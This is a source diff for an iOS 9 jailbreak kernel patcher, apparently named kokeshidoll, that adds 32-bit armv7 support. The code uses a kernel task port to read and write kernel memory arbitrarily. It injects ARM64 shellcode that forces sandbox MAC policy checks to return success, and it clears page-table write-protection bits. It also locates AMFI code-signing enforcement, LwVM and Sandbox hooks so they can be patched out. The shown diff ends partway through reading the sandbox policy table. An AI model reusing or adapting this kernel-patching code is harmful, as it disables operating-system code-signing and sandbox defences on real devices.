@@ -3,7 +3,8 @@
  *  kokeshidoll
  *
  *  Created by sakuRdev on 2021/12/02.
- *  Copyright (c) 2021 sakuRdev. All rights reserved.
+ *  Update by sakuRdev on 2022/04/29 for armv7
+ *  Copyright (c) 2021 - 2022 sakuRdev. All rights reserved.
  *
  *  Permission is hereby granted, free of charge, to any person obtaining a copy
  *  of this software and associated documentation files (the "Software"), to deal
@@ -36,12 +37,9 @@
 
 #include <sys/mount.h>
 
-//#include "unjail9.h"
-#include "patchfinder64.h"
+#include "unjail9.h"
 
 #include "mac.h"
-
-#define PATCH_TFP0 1
 
 #ifdef DEBUG
 #define DEBUGLog(str, args...)\
@@ -53,7 +51,6 @@ NSLog(@str, ##args);\
 #define DEBUGLog(str, args...)
 #endif
 
-// GUI
 extern void (*printLog)(const char *text, ...);
 
 mach_port_t tfp0 = 0;
@@ -63,7 +60,7 @@ kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_
 kern_return_t mach_vm_protect(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection);
 kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
 
-static void copyin(void* to, uint64_t from, size_t size) {
+static void copyin(void* to, kaddr_t from, size_t size) {
     mach_vm_size_t outsize = size;
     size_t szt = size;
     if (size > 0x1000) {
@@ -85,36 +82,62 @@ static void copyin(void* to, uint64_t from, size_t size) {
     }
 }
 
-static void copyout(uint64_t to, void* from, size_t size) {
+static void copyout(kaddr_t to, void* from, size_t size) {
     mach_vm_write(tfp0, to, (vm_offset_t)from, (mach_msg_type_number_t)size);
 }
 
-static uint64_t ReadAnywhere64(uint64_t addr) {
+#ifdef __LP64__
+static uint64_t rk64(uint64_t addr) {
     uint64_t val = 0;
     copyin(&val, addr, 8);
     return val;
 }
 
-static uint64_t WriteAnywhere64(uint64_t addr, uint64_t val) {
+static uint64_t wk64(uint64_t addr, uint64_t val) {
     copyout(addr, &val, 8);
     return val;
 }
+#endif
 
-static uint32_t ReadAnywhere32(uint64_t addr) {
+static uint32_t rk32(kaddr_t addr) {
     uint32_t val = 0;
     copyin(&val, addr, 4);
     return val;
 }
 
-static uint64_t WriteAnywhere32(uint64_t addr, uint32_t val) {
+static kaddr_t wk32(kaddr_t addr, uint32_t val) {
     copyout(addr, &val, 4);
     return val;
 }
 
-static uint8_t WriteAnywhere8(uint64_t addr, uint8_t val) {
+static kaddr_t wk16(kaddr_t addr, uint16_t val) {
+    copyout(addr, &val, 2);
+    return val;
+}
+
+static kaddr_t wk8(kaddr_t addr, uint8_t val) {
     copyout(addr, &val, 1);
     return val;
 }
+
+static kaddr_t rkptr(kaddr_t addr)
+{
+#ifdef __LP64__
+    return rk64(addr);
+#else
+    return rk32(addr);
+#endif
+}
+
+static kaddr_t wkptr(kaddr_t addr, kaddr_t val)
+{
+#ifdef __LP64__
+    return wk64(addr, val);
+#else
+    return wk32(addr, val);
+#endif
+}
+
 
 static uint8_t *kdata = NULL;
 static size_t ksize = 0;
@@ -123,7 +146,118 @@ static uint64_t kernel_entry = 0;
 uint64_t kerndumpbase = -1;
 static void *kernel_mh = 0;
 
-static uint64_t KOFFSET(uint64_t base, uint64_t off)
+#ifndef __LP64__
+kaddr_t text_vmaddr = 0;
+size_t text_vmsize = 0;
+kaddr_t text_text_sec_addr = 0;
+size_t text_text_sec_size = 0;
+kaddr_t text_const_sec_addr = 0;
+size_t text_const_sec_size = 0;
+kaddr_t text_cstring_sec_addr = 0;
+size_t text_cstring_sec_size = 0;
+kaddr_t text_os_log_sec_addr = 0;
+size_t text_os_log_sec_size = 0;
+kaddr_t data_vmaddr = 0;
+size_t data_vmsize = 0;
+
+uint32_t tte_virt;
+uint32_t tte_phys;
+
+#define TTB_SIZE            4096
+#define L1_SECT_S_BIT       (1 << 16)
+#define L1_SECT_PROTO       (1 << 1)        /* 0b10 */
+#define L1_SECT_AP_URW      (1 << 10) | (1 << 11)
+#define L1_SECT_APX         (1 << 15)
+#define L1_SECT_DEFPROT     (L1_SECT_AP_URW | L1_SECT_APX)
+#define L1_SECT_SORDER      (0)            /* 0b00, not cacheable, strongly ordered. */
+#define L1_SECT_DEFCACHE    (L1_SECT_SORDER)
+#define L1_PROTO_TTE(entry) (entry | L1_SECT_S_BIT | L1_SECT_DEFPROT | L1_SECT_DEFCACHE)
+#define L1_PAGE_PROTO       (1 << 0)
+#define L1_COARSE_PT        (0xFFFFFC00)
+#define PT_SIZE             256
+#define L2_PAGE_APX         (1 << 9)
+
+void patch_page_table(uint32_t tte_virt, uint32_t tte_phys, uint32_t page) {
+    uint32_t i = page >> 20;
+    uint32_t j = (page >> 12) & 0xFF;
+    uint32_t addr = tte_virt+(i<<2);
+    uint32_t entry = rk32(addr);
+    if ((entry & L1_PAGE_PROTO) == L1_PAGE_PROTO) {
+        uint32_t page_entry = ((entry & L1_COARSE_PT) - tte_phys) + tte_virt;
+        uint32_t addr2 = page_entry+(j<<2);
+        uint32_t entry2 = rk32(addr2);
+        if (entry2) {
+            uint32_t new_entry2 = (entry2 & (~L2_PAGE_APX));
+            wk32(addr2, new_entry2);
+        }
+    } else if ((entry & L1_SECT_PROTO) == L1_SECT_PROTO) {
+        uint32_t new_entry = L1_PROTO_TTE(entry);
+        new_entry &= ~L1_SECT_APX;
+        wk32(addr, new_entry);
+    }
+    
+    usleep(10000);
+    
+}
+
+static unsigned int
+make_b_w(int pos, int tgt)
+{
+    int delta;
+    unsigned int i;
+    unsigned short pfx;
+    unsigned short sfx;
+    
+    unsigned int omask_1k = 0xB800;
+    unsigned int omask_2k = 0xB000;
+    unsigned int omask_3k = 0x9800;
+    unsigned int omask_4k = 0x9000;
+    
+    unsigned int amask = 0x7FF;
+    int range;
+    
+    range = 0x400000;
+    
+    delta = tgt - pos - 4; /* range: 0x400000 */
+    i = 0;
+    if(tgt > pos) i = tgt - pos - 4;
+    if(tgt < pos) i = pos - tgt - 4;
+    
+    if (i < range){
+        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
+        sfx =  omask_1k | ((delta >>  1) & amask);
+        
+        return (unsigned int)pfx | ((unsigned int)sfx << 16);
+    }
+    
+    if (range < i && i < range*2){
+        delta -= range;
+        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
+        sfx =  omask_2k | ((delta >>  1) & amask);
+        
+        return (unsigned int)pfx | ((unsigned int)sfx << 16);
+    }
+    
+    if (range*2 < i && i < range*3){
+        delta -= range*2;
+        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
+        sfx =  omask_3k | ((delta >>  1) & amask);
+        
+        return (unsigned int)pfx | ((unsigned int)sfx << 16);
+    }
+    
+    if (range*3 < i && i < range*4){
+        delta -= range*3;
+        pfx = 0xF000 | ((delta >> 12) & 0x7FF);
+        sfx =  omask_4k | ((delta >>  1) & amask);
+        return (unsigned int)pfx | ((unsigned int)sfx << 16);
+    }
+    
+    return -1;
+}
+#endif
+
+static kaddr_t KOFFSET(kaddr_t base, kaddr_t off)
 {
     if(!off) {
 #ifdef DEBUG
@@ -137,20 +271,25 @@ static uint64_t KOFFSET(uint64_t base, uint64_t off)
     return base+off;
 }
 
-static int init_kernel(uint64_t base)
+static int init_kernel(kaddr_t base)
 {
     unsigned i;
-    uint8_t buf[0x4000];
+    uint8_t buf[KERNEL_HEADER_SIZE];
     const struct mach_header *hdr = (struct mach_header *)buf;
     const uint8_t *q;
     uint64_t min = -1;
     uint64_t max = 0;
     
     copyin(buf, base, sizeof(buf));
+#ifdef __LP64__
     q = buf + sizeof(struct mach_header) + 4;
+#else
+    q = buf + sizeof(struct mach_header) + 0;
+#endif
     
     for (i = 0; i < hdr->ncmds; i++) {
         const struct load_command *cmd = (struct load_command *)q;
+#ifdef __LP64__
         if (cmd->cmd == LC_SEGMENT_64) {
             const struct segment_command_64 *seg = (struct segment_command_64 *)q;
             if (min > seg->vmaddr) {
@@ -160,16 +299,59 @@ static int init_kernel(uint64_t base)
                 max = seg->vmaddr + seg->vmsize;
             }
         }
+#else
+        if (cmd->cmd == LC_SEGMENT) {
+            const struct segment_command *seg = (struct segment_command *)q;
+            if (min > seg->vmaddr) {
+                min = seg->vmaddr;
+            }
+            if (max < seg->vmaddr + seg->vmsize) {
+                max = seg->vmaddr + seg->vmsize;
+            }
+            if (!strcmp(seg->segname, "__TEXT")) {
+                text_vmaddr = seg->vmaddr;
+                text_vmsize = seg->vmsize;
+                
+                const struct section *sec = (struct section *)(seg + 1);
+                for (uint32_t j = 0; j < seg->nsects; j++) {
+                    if (!strcmp(sec[j].sectname, "__text")) {
+                        text_text_sec_addr = sec[j].addr;
+                        text_text_sec_size = sec[j].size;
+                    } else if (!strcmp(sec[j].sectname, "__const")) {
+                        text_const_sec_addr = sec[j].addr;
+                        text_const_sec_size = sec[j].size;
+                    } else if (!strcmp(sec[j].sectname, "__cstring")) {
+                        text_cstring_sec_addr = sec[j].addr;
+                        text_cstring_sec_size = sec[j].size;
+                    } else if (!strcmp(sec[j].sectname, "__os_log")) {
+                        text_os_log_sec_addr = sec[j].addr;
+                        text_os_log_sec_size = sec[j].size;
+                    }
+                }
+            } else if (!strcmp(seg->segname, "__DATA")) {
+                data_vmaddr = seg->vmaddr;
+                data_vmsize = seg->vmsize;
+            }
+        }
+#endif
         if (cmd->cmd == LC_UNIXTHREAD) {
             uint32_t *ptr = (uint32_t *)(cmd + 1);
             uint32_t flavor = ptr[0];
             struct {
+#ifdef __LP64__
                 uint64_t x[29];    /* General purpose registers x0-x28 */
                 uint64_t fp;    /* Frame pointer x29 */
                 uint64_t lr;    /* Link register x30 */
                 uint64_t sp;    /* Stack pointer x31 */
                 uint64_t pc;     /* Program counter */
                 uint32_t cpsr;    /* Current program status register */
+#else
+                uint32_t    r[13];  /* General purpose register r0-r12 */
+                uint32_t    sp;     /* Stack pointer r13 */
+                uint32_t    lr;     /* Link register r14 */
+                uint32_t    pc;     /* Program counter r15 */
+                uint32_t    cpsr;   /* Current program status register */
+#endif
             } *thread = (void *)(ptr + 2);
             if (flavor == 6) {
                 kernel_entry = thread->pc;
@@ -194,6 +376,7 @@ static int init_kernel(uint64_t base)
 }
 
 
+#ifdef __LP64__
 /* pangu9 method */
 static void sbWriteCode(uint64_t shc, uint64_t x30_reg, uint64_t origret, uint64_t next)
 {
@@ -233,158 +416,179 @@ static void sbWriteCode(uint64_t shc, uint64_t x30_reg, uint64_t origret, uint64
     
     DEBUGLog("%llx: %llx, next: %llx", x30_reg, origret, next);
     
-                                             // _shellcode: check x30 register to branch which function it came from.
-    WriteAnywhere32(shc + 0x00, 0x58000110); //     ldr        x16, _x30_reg
-    WriteAnywhere32(shc + 0x04, 0xeb1003df); //     cmp        x30, x16
-    WriteAnywhere32(shc + 0x08, 0x54000060); //     b.eq       _ret0
-    WriteAnywhere32(shc + 0x0c, 0x58000128); //     ldr        x8, _next
-    WriteAnywhere32(shc + 0x10, 0xd61f0100); //     br         x8           // check the next x30 reg.
-                                             //  _ret0: x0 to 0 and jump to ret of original functions.
-    WriteAnywhere32(shc + 0x14, 0xd2800000); //     movz       x0, #0x0
-    WriteAnywhere32(shc + 0x18, 0x58000088); //     ldr        x8, _origret
-    WriteAnywhere32(shc + 0x1c, 0xd61f0100); //     br         x8
+                                  // _shellcode: check x30 register to branch which function it came from.
+    wk32(shc + 0x00, 0x58000110); //     ldr        x16, _lr_ptr
+    wk32(shc + 0x04, 0xeb1003df); //     cmp        x30, x16
+    wk32(shc + 0x08, 0x54000060); //     b.eq       _ret0
+    wk32(shc + 0x0c, 0x58000128); //     ldr        x8, _next
+    wk32(shc + 0x10, 0xd61f0100); //     br         x8
+                                  //  _ret0: x0 to 0 and jump to ret of original functions.
+    wk32(shc + 0x14, 0xd2800000); //     movz       x0, #0x0
+    wk32(shc + 0x18, 0x58000088); //     ldr        x8, _equal
+    wk32(shc + 0x1c, 0xd61f0100); //     br         x8
     
-    WriteAnywhere64(shc + 0x20, x30_reg);    //  _x30_reg
-    WriteAnywhere64(shc + 0x28, origret);    //  _origret
-    WriteAnywhere64(shc + 0x30, next);       //  _next
+    wkptr(shc + 0x20, x30_reg);   // _x30_reg
+    wkptr(shc + 0x28, equal);     // _equal
+    wkptr(shc + 0x30, next);      // _next
 }
+#endif
 
-static int kpatch9(uint64_t region, uint64_t lwvm_type)
+static int kpatch9(kaddr_t region, kaddr_t lwvm_type)
 {
     init_kernel(region);
     
     /*--- helper ---*/
-    uint64_t ret0_gadget;
-    uint64_t ret1_gadget;
+    kaddr_t ret0_gadget;
+    kaddr_t ret1_gadget;
     
-    /*--- AMFI.kext ---*/
-    // __DATA.__got
-    uint64_t amfi_PE_i_can_has_debugger_got;
-    uint64_t amfi_cs_enforcement_got;
-    uint64_t amfi_vnode_isreg_got;
+    /*--- AMFI patchfinder ---*/
+    // __got
+    kaddr_t amfi_PE_i_can_has_debugger_got;
+    kaddr_t amfi_cs_enforcement_got;
+#ifdef __LP64__
+    kaddr_t amfi_vnode_isreg_got;
     
-    // for shellcode
-    uint64_t _amfi_execve_hook;
-    uint64_t _vnode_isreg;
-    uint64_t amfiBase;
+    // shellcode
+    kaddr_t _amfi_execve_hook;
+    kaddr_t _vnode_isreg;
+    kaddr_t amfiBase;
     
-    /*--- LwVM.kext ---*/
-    // __DATA.__got
-    uint64_t lwvm_krnl_conf_got;
+#else
+    // armv7
+    kaddr_t amfi_execve_ret;
+    kaddr_t cs_enforcement_disable;
+#endif
     
-    // jmpto
-    uint64_t lwvm_jump;
+    /*--- LwVM patchfinder ---*/
+    // __got
+    kaddr_t lwvm_krnl_conf_got;
     
-    /*--- Sandbox.kext ---*/
+    // jmp
+    kaddr_t lwvm_jump;
+    
+    /*--- Sandbox patchfinder ---*/
     // policy_ops
-    uint64_t sbops;
+    kaddr_t sbops;
     
-    // for shellcode
-    uint64_t memset_stub;
-    uint64_t sbBase;
+#ifdef __LP64__
+    // shellcode
+    kaddr_t memset_stub;
+    kaddr_t sbBase;
     
-    /*-- MAC policies --*/
-    uint64_t proc_check_fork_ret;
-    uint64_t proc_check_fork_lr;
+    /*-- MAC policy --*/
+    kaddr_t proc_check_fork_ret;
+    kaddr_t proc_check_fork_lr;
     
-    uint64_t iokit_check_open_ret;
-    uint64_t iokit_check_open_lr;
+    kaddr_t iokit_check_open_ret;
+    kaddr_t iokit_check_open_lr;
     
-    uint64_t mount_check_fsctl_ret;
-    uint64_t mount_check_fsctl_lr;
+    kaddr_t mount_check_fsctl_ret;
+    kaddr_t mount_check_fsctl_lr;
     
-    uint64_t vnode_check_rename_ret;
-    uint64_t vnode_check_rename_lr_1;
-    uint64_t vnode_check_rename_lr_2;
-    uint64_t vnode_check_rename_lr_3;
-    uint64_t vnode_check_rename_lr_4;
+    kaddr_t vnode_check_rename_ret;
+    kaddr_t vnode_check_rename_lr_1;
+    kaddr_t vnode_check_rename_lr_2;
+    kaddr_t vnode_check_rename_lr_3;
+    kaddr_t vnode_check_rename_lr_4;
     
-    uint64_t vnode_check_access_ret;
-    uint64_t vnode_check_access_lr;
+    kaddr_t vnode_check_access_ret;
+    kaddr_t vnode_check_access_lr;
     
-    uint64_t vnode_check_chroot_ret;
-    uint64_t vnode_check_chroot_lr;
+    kaddr_t vnode_check_chroot_ret;
+    kaddr_t vnode_check_chroot_lr;
     
-    uint64_t vnode_check_create_ret;
-    uint64_t vnode_check_create_lr_1;
-    uint64_t vnode_check_create_lr_2;
-    uint64_t vnode_check_create_lr_3;
+    kaddr_t vnode_check_create_ret;
+    kaddr_t vnode_check_create_lr_1;
+    kaddr_t vnode_check_create_lr_2;
+    kaddr_t vnode_check_create_lr_3;
     
-    uint64_t vnode_check_deleteextattr_ret;
-    uint64_t vnode_check_deleteextattr_lr;
+    kaddr_t vnode_check_deleteextattr_ret;
+    kaddr_t vnode_check_deleteextattr_lr;
     
-    uint64_t vnode_check_exchangedata_ret;
-    uint64_t vnode_check_exchangedata_lr_1;
-    uint64_t vnode_check_exchangedata_lr_2;
+    kaddr_t vnode_check_exchangedata_ret;
+    kaddr_t vnode_check_exchangedata_lr_1;
+    kaddr_t vnode_check_exchangedata_lr_2;
     
-    uint64_t vnode_check_getattrlist_ret;
-    uint64_t vnode_check_getattrlist_lr;
+    kaddr_t vnode_check_getattrlist_ret;
+    kaddr_t vnode_check_getattrlist_lr;
     
-    uint64_t vnode_check_getextattr_ret;
-    uint64_t vnode_check_getextattr_lr;
+    kaddr_t vnode_check_getextattr_ret;
+    kaddr_t vnode_check_getextattr_lr;
     
-    uint64_t vnode_check_ioctl_ret;
-    uint64_t vnode_check_ioctl_lr;
+    kaddr_t vnode_check_ioctl_ret;
+    kaddr_t vnode_check_ioctl_lr;
     
-    uint64_t vnode_check_link_ret;
-    uint64_t vnode_check_link_lr_1;
-    uint64_t vnode_check_link_lr_2;
-    uint64_t vnode_check_link_lr_3;
+    kaddr_t vnode_check_link_ret;
+    kaddr_t vnode_check_link_lr_1;
+    kaddr_t vnode_check_link_lr_2;
+    kaddr_t vnode_check_link_lr_3;
     
-    uint64_t vnode_check_listextattr_ret;
-    uint64_t vnode_check_listextattr_lr;
+    kaddr_t vnode_check_listextattr_ret;
+    kaddr_t vnode_check_listextattr_lr;
     
-    uint64_t vnode_check_open_ret;
-    uint64_t vnode_check_open_lr;
+    kaddr_t vnode_check_open_ret;
+    kaddr_t vnode_check_open_lr;
     
-    uint64_t vnode_check_readlink_ret;
-    uint64_t vnode_check_readlink_lr;
+    kaddr_t vnode_check_readlink_ret;
+    kaddr_t vnode_check_readlink_lr;
     
-    uint64_t vnode_check_revoke_ret;
-    uint64_t vnode_check_revoke_lr;
+    kaddr_t vnode_check_revoke_ret;
+    kaddr_t vnode_check_revoke_lr;
     
-    uint64_t vnode_check_setattrlist_ret;
-    uint64_t vnode_check_setattrlist_lr;
+    kaddr_t vnode_check_setattrlist_ret;
+    kaddr_t vnode_check_setattrlist_lr;
     
-    uint64_t vnode_check_setextattr_ret;
-    uint64_t vnode_check_setextattr_lr;
+    kaddr_t vnode_check_setextattr_ret;
+    kaddr_t vnode_check_setextattr_lr;
     
-    uint64_t vnode_check_setflags_ret;
-    uint64_t vnode_check_setflags_lr;
+    kaddr_t vnode_check_setflags_ret;
+    kaddr_t vnode_check_setflags_lr;
     
-    uint64_t vnode_check_setmode_ret;
-    uint64_t vnode_check_setmode_lr;
+    kaddr_t vnode_check_setmode_ret;
+    kaddr_t vnode_check_setmode_lr;
     
-    uint64_t vnode_check_setowner_ret;
-    uint64_t vnode_check_setowner_lr;
+    kaddr_t vnode_check_setowner_ret;
+    kaddr_t vnode_check_setowner_lr;
     
-    uint64_t vnode_check_setutimes_ret;
-    uint64_t vnode_check_setutimes_lr;
+    kaddr_t vnode_check_setutimes_ret;
+    kaddr_t vnode_check_setutimes_lr;
     
-    uint64_t vnode_check_stat_ret;
-    uint64_t vnode_check_stat_lr;
+    kaddr_t vnode_check_stat_ret;
+    kaddr_t vnode_check_stat_lr;
     
-    uint64_t vnode_check_truncate_ret;
-    uint64_t vnode_check_truncate_lr;
+    kaddr_t vnode_check_truncate_ret;
+    kaddr_t vnode_check_truncate_lr;
     
-    uint64_t vnode_check_unlink_ret;
-    uint64_t vnode_check_unlink_lr_1;
-    uint64_t vnode_check_unlink_lr_2;
+    kaddr_t vnode_check_unlink_ret;
+    kaddr_t vnode_check_unlink_lr_1;
+    kaddr_t vnode_check_unlink_lr_2;
     
-    uint64_t file_check_mmap_ret;
-    uint64_t file_check_mmap_lr;
+    kaddr_t file_check_mmap_ret;
+    kaddr_t file_check_mmap_lr;
+#endif
     
-    // __DATA.__got
-    uint64_t sb_PE_i_can_has_debugger_got;
-    uint64_t sb_memset_got;
-    uint64_t sb_vfs_rootvnode_got;
+    // __got
+    kaddr_t sb_PE_i_can_has_debugger_got;
+#ifdef __LP64__
+    kaddr_t sb_memset_got;
+#endif
+    kaddr_t sb_vfs_rootvnode_got;
     
     // fn
-    uint64_t vfs_rootvnode_fn;
-    uint64_t rootvnode;
-    uint64_t rootfs_vnode;
+    kaddr_t vfs_rootvnode_fn;
+    kaddr_t rootvnode;
+    kaddr_t rootfs_vnode;
     
-    // MAC setup
+#ifndef __LP64__
+    // legacy
+    kaddr_t vm_fault_enter;
+    kaddr_t vm_map_enter;
+    kaddr_t vm_map_protect;
+    kaddr_t csops;
+    kaddr_t pmap_location;
+#endif
+    
+    // MAC
     struct mac_policy_ops mpc_ops;
     memset(&mpc_ops, '\0', sizeof(mpc_ops));
     
@@ -398,31 +602,49 @@ static int kpatch9(uint64_t region, uint64_t lwvm_type)
     }
     
     {
-        DEBUGLog("AMFI __DATA.__got");
+        DEBUGLog("AMFI __got");
         if(!(amfi_PE_i_can_has_debugger_got = KOFFSET(region, find_amfi_PE_i_can_has_debugger_got(region, kdata, ksize)))) goto fail;
         if(!(amfi_cs_enforcement_got = KOFFSET(region, find_amfi_cs_enforcement_got(region, kdata, ksize)))) goto fail;
+#ifdef __LP64__
         if(!(amfi_vnode_isreg_got = KOFFSET(region, find_vnode_isreg_in_amfi_execve_hook(region, kdata, ksize)))) goto fail;
+#endif
     }
     
+#ifdef __LP64__
     {
         DEBUGLog("AMFI shellcode");
         if(!(_amfi_execve_hook = KOFFSET(region, find_amfi_execve_hook(region, kdata, ksize)))) goto fail;
         
-        _vnode_isreg = ReadAnywhere64(amfi_vnode_isreg_got); // 9.3.3: 0xffffff800414e214
+        _vnode_isreg = rkptr(amfi_vnode_isreg_got); // 9.3.3: 0xffffff800414e214
         if(!_vnode_isreg) {
             DEBUGLog("[ERROR] Failed to read offset!");
             goto fail;
         }
     }
+#endif
+    
+#ifndef __LP64__
+    {
+        DEBUGLog("AMFI");
+        if(!(amfi_execve_ret = KOFFSET(region, find_amfi_execve_ret(region, kdata, ksize)))) goto fail;
+        if(!(cs_enforcement_disable = KOFFSET(region, find_cs_enforcement_disable_amfi(region, kdata, ksize)))) goto fail;
+    }
+#endif
     
     {
-        DEBUGLog("LwVM __DATA.__got");
+        DEBUGLog("LwVM __got");
         if(lwvm_type == 1){
-            // 9.3.2-9.3.5
+            // 9.3.2, 9.3.3, 9.3.4, 9.3.5
             if(!(lwvm_krnl_conf_got = KOFFSET(region, find_PE_i_can_has_kernel_configuration_got(region, kdata, ksize)))) goto fail;
         } else {
             // For 9.3.1 and below, find _PE_i_can_has_debugger.stub and bypass isWriteProtected check.
+#ifdef __LP64__
+            // 9.2-9.3.1
             if(!(lwvm_krnl_conf_got = KOFFSET(region, find_LwVM_PE_i_can_has_debugger_got(region, kdata, ksize)))) goto fail;
+#else
+            // TODO
+            goto fail;
+#endif
         }
         if(!(lwvm_jump = KOFFSET(region, find_lwvm_jump(region, kdata, ksize)))) goto fail;
     }
@@ -431,43 +653,45 @@ static int kpatch9(uint64_t region, uint64_t lwvm_type)
         DEBUGLog("Sandbox ops");
         if(!(sbops = KOFFSET(region, find_sandbox_mac_policy_ops(region, kdata, ksize)))) goto fail;
     }
-    
+
+#ifdef __LP64__
     {
         DEBUGLog("_memset.stub");
-        if(!(memset_stub = KOFFSET(region, find_memset(region, kdata, ksize)))) goto fail; // or rk64(__got)
+        if(!(memset_stub = KOFFSET(region, find_memset(region, kdata, ksize)))) goto fail;
     }
+#endif
     
     {
         DEBUGLog("MAC");
-        mpc_ops.mpo_mount_check_remount         = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_remount));
-        mpc_ops.mpo_vnode_check_exec            = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec));
-        mpc_ops.mpo_proc_check_fork             = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork));
-        mpc_ops.mpo_iokit_check_open            = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_open));
-        mpc_ops.mpo_mount_check_fsctl           = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_fsctl));
-        mpc_ops.mpo_vnode_check_rename          = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename));
-        mpc_ops.mpo_vnode_check_access          = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access));
-        mpc_ops.mpo_vnode_check_chroot          = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot));
-        mpc_ops.mpo_vnode_check_create          = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create));
-        mpc_ops.mpo_vnode_check_deleteextattr   = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr));
-        mpc_ops.mpo_vnode_check_exchangedata    = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata));
-        mpc_ops.mpo_vnode_check_getattrlist     = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist));
-        mpc_ops.mpo_vnode_check_getextattr      = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr));
-        mpc_ops.mpo_vnode_check_ioctl           = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl));
-        mpc_ops.mpo_vnode_check_link            = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link));
-        mpc_ops.mpo_vnode_check_listextattr     = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr));
-        mpc_ops.mpo_vnode_check_open            = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open));
-        mpc_ops.mpo_vnode_check_readlink        = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink));
-        mpc_ops.mpo_vnode_check_revoke          = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_revoke));
-        mpc_ops.mpo_vnode_check_setattrlist     = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist));
-        mpc_ops.mpo_vnode_check_setextattr      = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr));
-        mpc_ops.mpo_vnode_check_setflags        = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags));
-        mpc_ops.mpo_vnode_check_setmode         = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode));
-        mpc_ops.mpo_vnode_check_setowner        = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner));
-        mpc_ops.mpo_vnode_check_setutimes       = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes));
-        mpc_ops.mpo_vnode_check_stat            = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat));
-        mpc_ops.mpo_vnode_check_truncate        = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate));
-        mpc_ops.mpo_vnode_check_unlink          = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink));
-        mpc_ops.mpo_file_check_mmap             = ReadAnywhere64(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap));
+        mpc_ops.mpo_mount_check_remount         = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_remount));
+        mpc_ops.mpo_vnode_check_exec            = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec));
+        mpc_ops.mpo_proc_check_fork             = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork));
+        mpc_ops.mpo_iokit_check_open            = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_open));
+        mpc_ops.mpo_mount_check_fsctl           = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_fsctl));
+        mpc_ops.mpo_vnode_check_rename          = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename));
+        mpc_ops.mpo_vnode_check_access          = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access));
+        mpc_ops.mpo_vnode_check_chroot          = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot));
+        mpc_ops.mpo_vnode_check_create          = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create));
+        mpc_ops.mpo_vnode_check_deleteextattr   = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr));
+        mpc_ops.mpo_vnode_check_exchangedata    = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata));
+        mpc_ops.mpo_vnode_check_getattrlist     = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist));
+        mpc_ops.mpo_vnode_check_getextattr      = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr));
+        mpc_ops.mpo_vnode_check_ioctl           = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl));
+        mpc_ops.mpo_vnode_check_link            = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link));
+        mpc_ops.mpo_vnode_check_listextattr     = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr));
+        mpc_ops.mpo_vnode_check_open            = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open));
+        mpc_ops.mpo_vnode_check_readlink        = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink));
+        mpc_ops.mpo_vnode_check_revoke          = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_revoke));
